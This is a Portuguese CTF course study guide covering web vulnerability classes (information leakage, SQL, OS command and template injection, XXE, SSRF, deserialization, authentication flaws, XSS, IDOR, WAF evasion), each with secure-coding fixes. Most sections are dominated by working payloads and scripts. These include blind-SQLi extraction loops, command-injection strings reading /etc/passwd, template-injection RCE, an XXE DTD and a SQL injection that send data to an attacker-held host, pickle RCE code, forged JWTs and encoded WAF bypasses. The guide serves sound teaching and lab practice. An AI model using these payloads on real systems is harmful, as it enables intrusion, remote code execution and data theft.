# Guia Geral por Tipo de Vulnerabilidade — AEV CTF

> Referência de metodologia para cada classe de vulnerabilidade.
> Não é específico de nenhum challenge — aplica-se a qualquer app que encontres.

---

## Índice

1. [Information Leakage](#1-information-leakage)
2. [SQL Injection](#2-sql-injection)
3. [OS Command Injection](#3-os-command-injection)
4. [Server-Side Template Injection (SSTI)](#4-server-side-template-injection-ssti)
5. [XML External Entity (XXE)](#5-xml-external-entity-xxe)
6. [Server-Side Request Forgery (SSRF)](#6-server-side-request-forgery-ssrf)
7. [Insecure Deserialization](#7-insecure-deserialization)
8. [Broken Authentication](#8-broken-authentication)
9. [Cross-Site Scripting (XSS)](#9-cross-site-scripting-xss)
10. [Insecure Direct Object Reference (IDOR)](#10-insecure-direct-object-reference-idor)
11. [WAF Evasion](#11-waf-evasion)
12. [Fluxograma de Triagem](#12-fluxograma-de-triagem)

---

# 1. INFORMATION LEAKAGE

## O que é
Informação sensível (credenciais, flags, source code, configuração) exposta por descuido — não é preciso exploitar código, só **encontrar** onde está.

## CWEs relevantes
- CWE-200 — Exposure of Sensitive Information
- CWE-209 — Error Message Information Leak
- CWE-489 — Active Debug Code
- CWE-538 — Insertion of Sensitive Information into Externally-Accessible File

## Metodologia de reconhecimento

### Passo 1 — Headers e cookies
```bash
curl -v http://TARGET/ 2>&1 | grep -iE 'server:|x-powered|set-cookie|x-debug'
```
Headers como `Server`, `X-Powered-By`, `X-Debug-Token` revelam tecnologia e estado de debug.

### Passo 2 — Ficheiros comuns
```bash
for f in robots.txt sitemap.xml .env .git/HEAD .git/logs/HEAD \
         wp-config.php.bak config.py.bak .DS_Store; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" "http://TARGET/$f")
  echo "$f → $CODE"
done
```

### Passo 3 — Extensões de backup
Se encontras um ficheiro (ex: `config.py`), testa variantes:
```bash
for ext in .bak .old .orig .save .swp "~" .copy .tmp; do
  curl -s -o /dev/null -w "%{http_code}" "http://TARGET/static/config.py${ext}"
done
```

### Passo 4 — Endpoints de debug
```bash
for ep in /debug /debug/env /status /health /admin /metrics \
          /info /trace /actuator /server-status /_debug; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" "http://TARGET$ep")
  [ "$CODE" != "404" ] && echo "$ep → $CODE"
done
```

### Passo 5 — Comentários HTML e source
```bash
curl -s http://TARGET/ | grep -iE '<!--|flag|secret|password|token|TODO|FIXME|hidden'
```

### Passo 6 — JavaScript client-side
```bash
curl -s http://TARGET/ | grep -oP 'src="[^"]+"' 
# Ler cada .js e procurar constantes, API keys, IDs hardcoded
curl -s http://TARGET/static/app.js | grep -iE 'key|secret|admin|flag|token|password|API'
```

### Passo 7 — Directory listing
```bash
for dir in / /static/ /public/ /uploads/ /files/ /export/ /backup/; do
  curl -s "http://TARGET${dir}" | grep -qi "index of\|directory listing\|parent directory" && \
    echo "LISTING: $dir"
done
```

### Passo 8 — .git exposto
```bash
curl -s http://TARGET/.git/HEAD
# Se responde "ref: refs/heads/..." → repo exposto!
curl -s http://TARGET/.git/logs/HEAD          # commit messages (podem ter segredos)
curl -s http://TARGET/.git/config             # remotes, usernames
```

### Passo 9 — Erros verbosos
Provoca erros para ver se a app mostra stack traces:
```bash
curl -s http://TARGET/crash
curl -s http://TARGET/inexistente
curl -s "http://TARGET/?id=abc"               # tipo errado
curl -s "http://TARGET/search?q=%00"          # null byte
```

### Passo 10 — Tokens e cookies
Se a app devolve um JWT ou cookie, **descodifica sempre**:
```bash
# JWT (3 partes separadas por .)
echo "PAYLOAD_BASE64" | base64 -d 2>/dev/null
# Cookie genérico
echo "COOKIE_VALUE" | base64 -d 2>/dev/null
```
JWT não é encriptado — qualquer dado no payload é legível.

## Resumo
| Sinal | Técnica |
|-------|---------|
| Página aparentemente vazia | View source, grep comments |
| App retorna headers de debug | Procurar endpoints /debug, /status |
| URL com ficheiro conhecido | Testar extensões .bak, .old, .swp |
| JWT/cookie no login | Descodificar base64 |
| Erro 500 com detalhes | Ler stack trace, variáveis locais |
| Diretório com `/` no fim | Listing ativo? |

---

# 2. SQL INJECTION

## O que é
Input do utilizador é **concatenado diretamente** numa query SQL sem sanitização. Permite ler, modificar ou destruir dados.

## CWEs relevantes
- CWE-89 — SQL Injection

## Como detetar

### Teste rápido
Mete `'` em qualquer input (search, login, URL param). Se:
- Dá **erro SQL** → SQLi confirmado, provavelmente error-based
- Dá **comportamento diferente** (menos resultados, página vazia) → possível blind SQLi
- **Nada muda** → provavelmente não há SQLi aqui (ou há filtro)

```bash
# Num campo de pesquisa
curl -s "http://TARGET/search?q=test'"
# Num login
curl -s -X POST http://TARGET/login -d "username=admin'&password=x"
```

## Sub-tipos e técnicas

### A) Auth bypass (comment injection)
**Quando:** form de login onde username/password vão para `WHERE user='X' AND pass='Y'`
```
username: admin' --
password: qualquer_coisa
```
O `--` comenta o resto da query → ignora a password.

**Variantes:**
```
admin' #                    (MySQL)
admin' --                   (PostgreSQL, SQLite, MySQL)
admin'/*                    (MySQL)
' OR 1=1 --                 (bypass genérico, retorna primeiro user)
' OR '1'='1                 (sem comentário, fecha a string)
```

### B) Error-based
**Quando:** a app mostra erros SQL ao utilizador.

**MySQL — `updatexml()`:**
```sql
' AND updatexml(1, CONCAT(0x7e, (SELECT secret FROM vault LIMIT 1)), 1) --
```
O erro contém o valor porque `updatexml()` rejeita XML inválido e mostra-o.

**MySQL — `extractvalue()`:**
```sql
' AND extractvalue(1, CONCAT(0x7e, (SELECT secret FROM vault LIMIT 1))) --
```

**PostgreSQL — casting:**
```sql
' AND 1=CAST((SELECT secret FROM vault LIMIT 1) AS int) --
```

### C) UNION-based
**Quando:** o resultado da query aparece na página (lista, tabela, detalhes).

**Passo 1 — Descobrir número de colunas:**
```sql
' UNION SELECT NULL --                    (1 coluna?)
' UNION SELECT NULL,NULL --               (2 colunas?)
' UNION SELECT NULL,NULL,NULL --          (3 colunas?)
' ORDER BY 1 --                           (alternativa)
' ORDER BY 5 --                           (se dá erro, são menos de 5)
```

**Passo 2 — Identificar colunas visíveis:**
```sql
' UNION SELECT 'A','B','C','D' --
```
Ver qual letra aparece na página → essa coluna é a que mostra dados.

**Passo 3 — Extrair dados:**
```sql
-- Descobrir tabelas (SQLite)
' UNION SELECT 1,name,3,4 FROM sqlite_master WHERE type='table' --

-- Descobrir tabelas (MySQL)
' UNION SELECT 1,table_name,3,4 FROM information_schema.tables --

-- Extrair dados da tabela alvo
' UNION SELECT 1,secret,3,4 FROM vault --
```

### D) Boolean-based blind
**Quando:** não vês o resultado da query, mas vês **diferença de comportamento** (resultados vs. zero, "found" vs. "not found").

**Conceito:** fazer perguntas sim/não sobre cada caracter.

```sql
-- O 1º caracter da flag é 'f' (ASCII 102)?
' OR (SELECT unicode(substr(secret,1,1)) FROM vault) = 102 --

-- Binary search (mais rápido):
' OR (SELECT unicode(substr(secret,1,1)) FROM vault) > 100 --   → sim?
' OR (SELECT unicode(substr(secret,1,1)) FROM vault) > 110 --   → não?
' OR (SELECT unicode(substr(secret,1,1)) FROM vault) > 105 --   → sim?
-- ... afunilar até encontrar o valor exato
```

**Script bash para automatizar:**
```bash
FLAG=""
for pos in $(seq 1 50); do
  low=32; high=126
  while [ $low -le $high ]; do
    mid=$(( (low + high) / 2 ))
    RESULT=$(curl -s "http://TARGET/search?q=' OR (SELECT unicode(substr(secret,$pos,1)) FROM vault) > $mid --")
    if echo "$RESULT" | grep -q "1 files found"; then
      low=$((mid + 1))
    else
      high=$((mid - 1))
    fi
  done
  [ $low -lt 32 ] || [ $low -gt 126 ] && break
  FLAG="${FLAG}$(printf "\\$(printf '%03o' $low)")"
  echo "$FLAG"
done
```

### E) Time-based blind
**Quando:** não há diferença visível no output — a única forma de distinguir é o **tempo de resposta**.

**MySQL:**
```sql
' AND IF((SELECT ascii(substring(secret,1,1)) FROM vault) > 100, SLEEP(0.5), 0) --
```
Se demora 0.5s → condição verdadeira. Se responde imediato → falsa.

**SQLite (heavy query):**
```sql
' AND CASE WHEN (unicode(substr((SELECT secret FROM vault),1,1)) > 100)
  THEN randomblob(50000000) ELSE 1 END --
```

**PostgreSQL:**
```sql
'; SELECT CASE WHEN (ascii(substr((SELECT secret FROM vault),1,1)) > 100)
  THEN pg_sleep(0.5) ELSE pg_sleep(0) END --
```

**Script com timing:**
```bash
for pos in $(seq 1 50); do
  low=32; high=126
  while [ $low -le $high ]; do
    mid=$(( (low + high) / 2 ))
    T_START=$(date +%s%N)
    curl -s "http://TARGET/submit" -d "name=x' AND IF(ascii(substring(secret,$pos,1))>$mid, SLEEP(0.5), 0) -- &msg=y"
    T_END=$(date +%s%N)
    ELAPSED=$(( (T_END - T_START) / 1000000 ))
    if [ $ELAPSED -gt 400 ]; then
      low=$((mid + 1))
    else
      high=$((mid - 1))
    fi
  done
  [ $low -lt 32 ] && break
  FLAG="${FLAG}$(printf "\\$(printf '%03o' $low)")"
  echo "$FLAG"
done
```

### F) Out-of-Band (OOB)
**Quando:** não tens output nem timing fiável, mas a app faz requests externos (HTTP, DNS).

**Técnica:** injetar uma URL que inclui os dados exfiltrados.
```sql
' UNION SELECT 'http://TEU_IP:9900/?d=' || secret FROM vault --
```
A app faz fetch dessa URL → capturas a flag no teu listener:
```bash
nc -lp 9900    # no teu servidor/VM
```

### G) INSERT injection
**Quando:** o input vai para um `INSERT INTO ... VALUES (...)` em vez de `SELECT`.

```sql
-- Campo name num formulário de guestbook:
x', (SELECT secret FROM vault)) --

-- Se a app usa o valor inserido algures visível, a flag aparece
```

## Dicas gerais SQLi
- **Descobre o SGBD:** erros diferentes, funções diferentes
  - `sqlite_version()` → SQLite
  - `@@version` → MySQL
  - `version()` → PostgreSQL
- **Tabela-alvo típica nos CTFs do prof:** `vault` (coluna `secret`)
- **Comentários:** `--` (espaço depois!), `#` (MySQL), `/* */`
- **Quotes:** se o input está entre `'`, fecha com `'`. Se não tem quotes (inteiro), não precisa.
- **UNION requer mesmo nº de colunas** — testa com ORDER BY ou NULL incremental

## Fix correto
```python
# ERRADO (vulnerável)
cursor.execute(f"SELECT * FROM users WHERE name = '{input}'")

# CORRETO (prepared statement / parameterized query)
cursor.execute("SELECT * FROM users WHERE name = ?", (input,))
```
**Nunca** concatenar input do utilizador em SQL. Usar **prepared statements** com placeholders.

---

# 3. OS COMMAND INJECTION

## O que é
Input do utilizador é passado para um comando shell (`os.system()`, `subprocess` com `shell=True`, backticks, `exec()`). O atacante injeta comandos adicionais.

## CWE
- CWE-78 — OS Command Injection

## Como detetar
A app faz alguma coisa que parece executar um comando no servidor? (ping, nslookup, backup, file listing, status check, label printing, log shipping)

### Teste rápido
```bash
# Separadores de comandos
; cat /etc/passwd
| cat /etc/passwd
& cat /etc/passwd
&& cat /etc/passwd
|| cat /etc/passwd

# Substituição
$(cat /etc/passwd)
`cat /etc/passwd`
```

Se algum destes mostrar o conteúdo do ficheiro → injection confirmado.

## Técnicas por contexto

### Básico — ponto-e-vírgula
```bash
curl -X POST http://TARGET/ping -d "host=localhost; cat /flag/flag"
```
O servidor executa: `ping -c 1 localhost; cat /flag/flag`

### Pipe
```bash
curl -X POST http://TARGET/ping -d "host=localhost | cat /flag/flag"
```

### Substituição de comando
```bash
curl -X POST http://TARGET/ticket -d "requester=x$(cat /flag/flag)&issue=test"
```
O output do `cat` fica embutido no valor — procura-o na resposta ou num log.

### Newline bypass
Quando há blacklist de `; | & $` mas **não filtra newlines** (`\n`):
```bash
curl -X POST http://TARGET/label --data-urlencode $'text=hello\ncat /flag/flag'
```
O shell interpreta a newline como separador de comandos.

### Glob bypass
Quando há blacklist de paths literais mas não de wildcards:
```bash
curl -X POST http://TARGET/audit -d "path=/flag/*"
```
O shell expande `/flag/*` → `/flag/flag`.

### Argument injection
Quando o input vai como **argumento** de um comando (ex: `tar`, `find`, `curl`):
```bash
# Se o comando é: tar czf backup.tar.gz <input>
# Injetar flags do tar:
--checkpoint=1 --checkpoint-action=exec=cat /flag/flag
```

### Second-order injection
O payload é **guardado** primeiro (config, nome, etc.) e **executado depois** por outro endpoint:
```bash
# Passo 1: guardar payload
curl -X POST http://TARGET/config -d "logdir=/tmp; cat /flag/flag"
# Passo 2: trigger a execução
curl -X POST http://TARGET/ship
```

### PATH override
Se a app executa um comando por nome (sem path absoluto) e aceita upload de scripts:
```bash
# Upload script com o mesmo nome do comando
curl -X POST http://TARGET/plugins \
  --data-urlencode 'name=sysdiag' \
  --data-urlencode $'script=#!/bin/sh\ncat /flag/flag'
# Executar — a app corre o TEU script em vez do original
curl -X POST http://TARGET/run -d "tool=sysdiag"
```

### Output indireto
Por vezes a flag **não aparece na resposta HTTP** — aparece num log, ficheiro, ou endpoint separado:
```bash
# Injeta no ticket
curl -X POST http://TARGET/ticket -d "requester=\$(cat /flag/flag)&issue=test"
# Lê o log
curl http://TARGET/log
```

## Fix correto
```python
# ERRADO
os.system(f"ping -c 1 {host}")
subprocess.run(f"ping -c 1 {host}", shell=True)

# CORRETO — lista de argumentos, sem shell
subprocess.run(["ping", "-c", "1", host])

# CORRETO — shlex.quote se shell=True é inevitável
import shlex
subprocess.run(f"ping -c 1 {shlex.quote(host)}", shell=True)
```
**Nunca** usar `shell=True` com input do utilizador. Usar listas de argumentos.

---

# 4. SERVER-SIDE TEMPLATE INJECTION (SSTI)

## O que é
Input do utilizador é interpretado como código de template no servidor (Jinja2, EJS, Twig, Freemarker...). Permite execução de código arbitrário.

## CWE
- CWE-94 — Code Injection

## Como detetar

### Recon universal
Mete estes payloads em qualquer campo que pareça ser processado por um template:
```
{{7*7}}          → se aparece 49, é Jinja2/Twig (Python/PHP)
${7*7}           → se aparece 49, é Freemarker/Velocity (Java)
<%= 7*7 %>       → se aparece 49, é EJS/ERB (Node.js/Ruby)
#{7*7}           → se aparece 49, é Pug/Jade (Node.js)
```

**Atenção:** SSTI ≠ XSS! Se `{{7*7}}` aparece como `49` no HTML, é **server-side** (o servidor calculou). Se aparece como `{{7*7}}` e o browser calcula, é client-side.

### Distinguir SSTI de XSS
- SSTI: o cálculo acontece **antes** de o HTML chegar ao browser
- XSS: o payload é HTML/JS executado **no browser**

## Exploração por engine

### Jinja2 (Python — Flask, Django)
```python
# Ler ficheiro
{{ ''.__class__.__mro__[1].__subclasses__() }}   # listar classes (recon)

# RCE direto (versão curta)
{{ cycler.__init__.__globals__.os.popen('cat /flag/flag').read() }}

# Alternativa
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}

# Outra alternativa
{{ request.__class__.__mro__[1].__subclasses__()[X]('cat /flag/flag',shell=True,stdout=-1).communicate() }}
```

### EJS (Node.js)
```javascript
<%= process.getBuiltinModule('child_process').execSync('cat /flag/flag').toString() %>

// Alternativa (versões mais antigas)
<%= require('child_process').execSync('cat /flag/flag') %>

// Alternativa
<%= global.process.mainModule.require('child_process').execSync('id') %>
```

### Twig (PHP)
```php
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("cat /flag/flag")}}
```

## Fix correto
```python
# ERRADO — render_template_string com input do utilizador
from flask import render_template_string
render_template_string(f"Hello {user_input}")

# CORRETO — passar como variável, não como template
render_template_string("Hello {{ name }}", name=user_input)
```
**Nunca** usar input do utilizador como parte do template. Passar como variável/contexto.

---

# 5. XML EXTERNAL ENTITY (XXE)

## O que é
A app faz parse de XML fornecido pelo utilizador sem desativar external entities. Permite ler ficheiros do servidor, SSRF, e por vezes RCE.

## CWE
- CWE-611 — Improper Restriction of XML External Entity Reference

## Como detetar
A app aceita upload/input de XML? (import, config, SOAP, SVG, DOCX)

## Payload básico — ler ficheiro
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///flag/flag">
]>
<record>&xxe;</record>
```

```bash
curl -X POST http://TARGET/import \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE f [<!ENTITY x SYSTEM "file:///flag/flag">]><r>&x;</r>'
```

## Variantes

### SSRF via XXE
```xml
<!ENTITY xxe SYSTEM "http://internal-service:8080/admin">
```

### XXE cego (out-of-band)
```xml
<!ENTITY % remote SYSTEM "http://TEU_IP:9900/evil.dtd">
%remote;
```
No teu servidor, `evil.dtd`:
```xml
<!ENTITY % file SYSTEM "file:///flag/flag">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://TEU_IP:9900/?d=%file;'>">
%eval;
%exfil;
```

### XXE via SVG
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

## Fix correto
```python
# Python (lxml)
from lxml import etree
parser = etree.XMLParser(resolve_entities=False, no_network=True)

# Python (defusedxml — melhor)
import defusedxml.ElementTree as ET
ET.fromstring(xml_input)
```
Desativar external entities e DTD processing no parser XML.

---

# 6. SERVER-SIDE REQUEST FORGERY (SSRF)

## O que é
A app faz requests HTTP (ou outros protocolos) a URLs fornecidas pelo utilizador. O atacante pode aceder a recursos internos ou ler ficheiros locais.

## CWE
- CWE-918 — Server-Side Request Forgery

## Como detetar
A app tem funcionalidade de: preview de URL, fetch de imagem, webhook, proxy, import from URL?

## Payloads

### Ler ficheiros locais
```bash
curl -X POST http://TARGET/preview -d "url=file:///flag/flag"
curl -X POST http://TARGET/preview -d "url=file:///etc/passwd"
```

### Aceder a serviços internos
```bash
curl -X POST http://TARGET/preview -d "url=http://127.0.0.1:8080/admin"
curl -X POST http://TARGET/preview -d "url=http://localhost:6379/"          # Redis
curl -X POST http://TARGET/preview -d "url=http://169.254.169.254/"         # AWS metadata
```

### Bypasses de filtro
```bash
# IP alternativo para localhost
http://0.0.0.0/
http://0177.0.0.1/           # octal
http://2130706433/            # decimal
http://0x7f000001/            # hex
http://[::1]/                 # IPv6

# DNS rebinding
http://spoofed.burpcollaborator.net/    # resolve para 127.0.0.1

# Redirect bypass
http://TEU_SITE/redirect?to=http://127.0.0.1:8080/admin
```

## Fix correto
- Whitelist de URLs/domínios permitidos
- Bloquear protocolos `file://`, `gopher://`, `dict://`
- Bloquear IPs privados (127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)
- Não seguir redirects cegamente

---

# 7. INSECURE DESERIALIZATION

## O que é
A app deserializa dados fornecidos pelo utilizador (pickle, YAML, Java serialized objects) sem validação. Permite execução de código arbitrário.

## CWE
- CWE-502 — Deserialization of Untrusted Data

## Como detetar
A app aceita: blobs base64, ficheiros serializados, "restore session", "import workspace"?
O header ou nome do campo sugere pickle, YAML, Java?

## Python pickle
```python
import pickle, base64, os

class Exploit:
    def __reduce__(self):
        return (os.system, ('cat /flag/flag',))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)
```

```bash
curl -X POST http://TARGET/restore -d "blob=<output_base64>"
```

### Variante — ler ficheiro (retorna conteúdo)
```python
class Exploit:
    def __reduce__(self):
        return (open, ('/flag/flag',))
```

## YAML (PyYAML)
```yaml
!!python/object/apply:os.system ['cat /flag/flag']
```

## Fix correto
```python
# NUNCA deserializar dados de utilizadores com pickle/yaml.load
# Se necessário, usar formatos seguros:
import json
data = json.loads(user_input)      # JSON é seguro

import yaml
data = yaml.safe_load(user_input)  # safe_load, NUNCA yaml.load
```

---

# 8. BROKEN AUTHENTICATION

## O que é
Falhas na implementação de autenticação ou gestão de sessões que permitem a um atacante assumir a identidade de outro utilizador.

## Sub-tipos e como abordar cada um

### A) Credenciais default
**Sinal:** form de login sem registo, app parece ser appliance/router/CMS
```bash
# Testar pares comuns
admin:admin  admin:admin123  admin:password  admin:1234
root:root    root:toor       guest:guest
```

### B) Brute-force (sem rate limiting)
**Sinal:** form de login sem captcha, sem lockout após N tentativas
```bash
for pw in password 123456 qwerty admin letmein welcome monkey master; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" -L -X POST \
    http://TARGET/login -d "username=admin&password=$pw")
  echo "$pw → $CODE"
done
```
**Detetar ausência de rate limit:** enviar 10 pedidos rápidos — se nenhum dá 429 ou bloqueio, não há limit.

### C) User enumeration
**Sinal:** mensagens de erro diferentes para "user não existe" vs "password errada"
```bash
curl -X POST http://TARGET/login -d "emp_id=admin&password=wrong"
# "Incorrect password" → user existe!
curl -X POST http://TARGET/login -d "emp_id=xxxxx&password=wrong"
# "No such employee" → user não existe
```
Enumerar usernames válidos e depois brute-force só nesses.

### D) Cookie/role editável no client
**Sinal:** cookie com `role=user`, `admin=false`, `is_staff=0`
```bash
# Mudar o cookie
curl -b "role=admin" http://TARGET/admin
curl -b "admin=true" http://TARGET/dashboard
```

### E) Session fixation
**Sinal:** o session ID **não muda** depois do login
```bash
# 1. Obter um sid
SID=$(curl -s -c - http://TARGET/ | grep sid | awk '{print $NF}')
# 2. Fazer alguém autenticar com o TEU sid (via bot/helpdesk endpoint)
curl -X POST http://TARGET/helpdesk/verify-link -b "sid=$SID"
# 3. O TEU sid agora está autenticado
curl -b "sid=$SID" http://TARGET/dashboard
```

### F) JWT alg:none
**Sinal:** a app usa JWT (3 partes base64 separadas por `.`)
```bash
# Forjar token sem assinatura
H=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr '+/' '-_' | tr -d '=')
P=$(echo -n '{"user":"admin","role":"admin"}' | base64 | tr '+/' '-_' | tr -d '=')
TOKEN="${H}.${P}."
curl -H "Authorization: Bearer $TOKEN" http://TARGET/admin
```

### G) JWT weak secret
**Sinal:** JWT com `alg: HS256` — o secret pode ser fraco
```bash
# Com hashcat (se disponível)
hashcat -a 3 -m 16500 "JWT_TOKEN" ?d?d?d?d       # 4 dígitos

# Com script Python
import hmac, hashlib, base64, json
header_payload = token.rsplit('.', 1)[0]
for pin in range(10000):
    secret = f"{pin:04d}"
    sig = base64.urlsafe_b64encode(
        hmac.new(secret.encode(), header_payload.encode(), hashlib.sha256).digest()
    ).rstrip(b'=').decode()
    if sig == original_sig:
        print(f"Secret: {secret}")
        break
```

### H) Predictable tokens
**Sinal:** tokens que parecem hashes curtos, ou app com endpoint de refresh
```bash
# Se token = sha1("username:timestamp") ou sha256("reset:username")
TOKEN=$(echo -n "admin:$(date +%s)" | sha1sum | cut -d' ' -f1)
curl -b "token=$TOKEN" http://TARGET/admin

TOKEN=$(echo -n "reset:admin" | sha256sum | cut -c1-20)
curl -X POST "http://TARGET/reset/$TOKEN" -d "password=hacked"
```

### I) Referer/header trust
**Sinal:** página que só é acessível "de dentro" (intranet, staff area)
```bash
curl http://TARGET/internal/page \
  -H "Referer: http://TARGET/staff-home" \
  -H "X-Forwarded-For: 127.0.0.1"
```

### J) Session não expirada (logout falso)
**Sinal:** logout só limpa o cookie, mas a sessão server-side continua válida
```bash
# Se consegues obter um sid antigo (logs, diagnostics, etc.)
curl -b "sid=LEAKED_SID" http://TARGET/dashboard
```

### K) Exposed credential store
**Sinal:** backup files, exports, SQL dumps acessíveis
```bash
curl http://TARGET/robots.txt
curl http://TARGET/export/
# Passwords em base64 ≠ encriptadas! Descodificar:
echo "YWRtaW4xMjM=" | base64 -d
```

## Fix correto
- Passwords: bcrypt/argon2 + salt
- Sessions: regenerar ID no login, invalidar no logout (server-side), expiração
- JWT: nunca aceitar `alg:none`, usar secrets fortes (≥256 bits), verificar sempre
- Rate limiting + account lockout
- Mensagens de erro genéricas ("Invalid credentials", nunca "user not found")

---

# 9. CROSS-SITE SCRIPTING (XSS)

## O que é
Input do utilizador é inserido no HTML sem escape, permitindo executar JavaScript no browser de outro utilizador.

## CWE
- CWE-79 — Cross-Site Scripting

## Tipos

### A) Reflected XSS
O payload vai no request (URL, form) e é refletido na resposta **sem escape**.

**Detetar:**
```bash
curl -s "http://TARGET/?q=<b>test</b>"
# Se "test" aparece em bold → não há escape
```

**Payloads:**
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
"><script>alert(1)</script>
'><img src=x onerror=alert(1)>
```

### B) Stored XSS
O payload é **guardado** (comentário, nota, perfil) e executado quando outro utilizador vê a página.

**Detetar:** submeter `<b>test</b>` num campo que outros utilizadores veem. Se aparece bold → stored XSS.

```bash
# Guardar payload
curl -X POST http://TARGET/comment -d "text=<img src=x onerror=alert(1)>"
# Quando alguém visitar a página, o JS executa
```

### C) DOM-based XSS
O payload é processado pelo **JavaScript client-side**, não pelo servidor. O servidor pode nem ver o payload (ex: vai no `#fragment`).

**Detetar:**
```bash
# O server NÃO reflete o payload no HTML
curl -s "http://TARGET/?card=<b>test</b>"    # sem <b> no response
# Mas o JS da página lê o parâmetro e mete no innerHTML
```

**Sinks comuns no JS:**
```javascript
document.getElementById('x').innerHTML = params.get('card')   // PERIGOSO
document.write(location.hash)                                  // PERIGOSO
eval(user_input)                                               // PERIGOSO
```

## Nos CTFs do professor
Os challenges XSS têm uma função `grant()` no JS da página. Chamar `grant()` seta um cookie e desbloqueia `/flag`:
```bash
# Payload que chama grant():
<img src=x onerror=grant()>
<script>grant()</script>

# Ou simular manualmente o cookie:
curl -b "xss_grant_CHALLENGE=1" http://TARGET/flag
```

## Fix correto
```python
# ERRADO — inserir input diretamente no HTML
return f"<p>Results for: {query}</p>"

# CORRETO — escape automático (Jinja2 faz por defeito com {{ }})
return render_template("results.html", query=query)

# CORRETO — sanitizar para contextos especiais
import markupsafe
safe = markupsafe.escape(user_input)
```
- Usar template engines com auto-escaping (Jinja2, React, etc.)
- CSP (Content-Security-Policy) como defesa em profundidade
- Para DOM XSS: usar `textContent` em vez de `innerHTML`

---

# 10. INSECURE DIRECT OBJECT REFERENCE (IDOR)

## O que é
A app usa IDs (numéricos, sequenciais) para aceder a objetos (notas, perfis, ficheiros) mas **não verifica se o utilizador tem permissão** para aceder àquele objeto específico.

## CWE
- CWE-639 — Authorization Bypass Through User-Controlled Key

## Como detetar
- URLs com IDs: `/note/1`, `/user/42`, `/invoice/100`
- API com IDs: `/api/users/7`, `/api/orders/123`
- O ID é sequencial ou previsível?

## Técnica
```bash
# Login como utilizador normal
curl -c cookies.txt -L -X POST http://TARGET/login -d "user=guest&pw=guest123"

# Iterar IDs
for i in $(seq 1 20); do
  echo "=== ID $i ==="
  curl -s -b cookies.txt "http://TARGET/note/$i"
done
```

**Variantes:**
- IDs no body: `curl -X POST -d "user_id=1"` → testar `user_id=2`, `user_id=0`
- Parâmetros de query: `?verbose=true`, `?full=1`, `?debug=1` podem expor campos extra
- UUIDs: se conseguires descobrir o UUID de outro utilizador (leaks, logs, API responses), funciona igual

## Fix correto
```python
# ERRADO — só verifica se está logged in
@app.route("/note/<int:id>")
def note(id):
    if "user" not in session:
        abort(401)
    return get_note(id)         # qualquer nota!

# CORRETO — verifica ownership
@app.route("/note/<int:id>")
def note(id):
    if "user" not in session:
        abort(401)
    note = get_note(id)
    if note.owner != session["user"]:
        abort(403)              # não é tua!
    return note
```
**Nunca** confiar que "esconder o link" ou "usar UUIDs" é suficiente. Verificar **sempre** ownership no servidor.

---

# 11. WAF EVASION

## O que é
Técnicas para contornar Web Application Firewalls que filtram payloads maliciosos.

## Técnicas comuns

### HTTP Parameter Pollution (HPP)
```bash
# WAF vê o 1º valor, app usa o último
curl "http://TARGET/run?cmd=ls&cmd=ls;cat /flag/flag"
```

### Double encoding
```bash
# ; → %3b → %253b
# WAF descodifica 1x (vê %3b, não reconhece como ;)
# App descodifica 2x (obtém ;)
curl "http://TARGET/run?cmd=ls%253bcat+/flag/flag"
```

### Case variation
```sql
SeLeCt * FrOm vault     -- SQL é case-insensitive
```

### Concatenação
```bash
c''at /flag/flag         # bash ignora quotes vazias
c\at /flag/flag          # backslash escape
cat /fla?/fla?           # wildcards
```

### Encoding alternativo
```bash
# Octal em printf
$(printf '\143\141\164 /flag/flag')    # = cat /flag/flag

# Hex
$(printf '\x63\x61\x74 /flag/flag')   # = cat /flag/flag

# Base64
$(echo Y2F0IC9mbGFnL2ZsYWc= | base64 -d)   # = cat /flag/flag
```

### Espaços alternativos
```bash
cat${IFS}/flag/flag      # $IFS = Internal Field Separator (espaço)
cat<>/flag/flag           # I/O redirection
{cat,/flag/flag}          # brace expansion
```

---

# 12. FLUXOGRAMA DE TRIAGEM

Quando abres um challenge novo e não sabes por onde começar:

```
1. curl -v URL
   ├── Tem form de LOGIN? ─────────────────────┐
   │   ├── Testa credenciais default            │ → Auth
   │   ├── Testa admin' --                      │ → SQLi
   │   └── Olha cookies (JWT? role? base64?)    │ → Auth/JWT
   │                                            │
   ├── Tem campo de PESQUISA? ──────────────────┤
   │   └── Testa '  e  ' OR 1=1 --             │ → SQLi
   │                                            │
   ├── Tem campo que EXECUTA algo? ─────────────┤
   │   (ping, backup, lookup, status)           │
   │   └── Testa ; cat /flag/flag               │ → OS Injection
   │                                            │
   ├── Tem campo de TEXTO/template? ────────────┤
   │   └── Testa {{7*7}}                        │ → SSTI
   │                                            │
   ├── Aceita UPLOAD de XML/ficheiro? ──────────┤
   │   ├── XML → testa XXE                      │ → XXE
   │   └── Blob/pickle → deserialization        │ → Deser
   │                                            │
   ├── Tem FETCH/preview de URL? ───────────────┤
   │   └── Testa file:///etc/passwd             │ → SSRF
   │                                            │
   ├── IDs na URL? (/note/1, /user/42) ────────┤
   │   └── Itera IDs com sessão válida          │ → IDOR
   │                                            │
   ├── Input REFLETIDO na página? ──────────────┤
   │   └── Testa <img src=x onerror=alert(1)>  │ → XSS
   │                                            │
   └── NADA do anterior? ──────────────────────┤
       ├── View source (comments, hidden)       │ → Infoleak
       ├── robots.txt, .git/HEAD, /debug        │ → Infoleak
       ├── Extensões .bak, .old, .swp           │ → Infoleak
       └── JS client-side (constantes, IDs)     │ → Infoleak
```

---

> **Nota:** este guia cobre as classes de vulnerabilidade presentes nos CTFs da cadeira AEV.
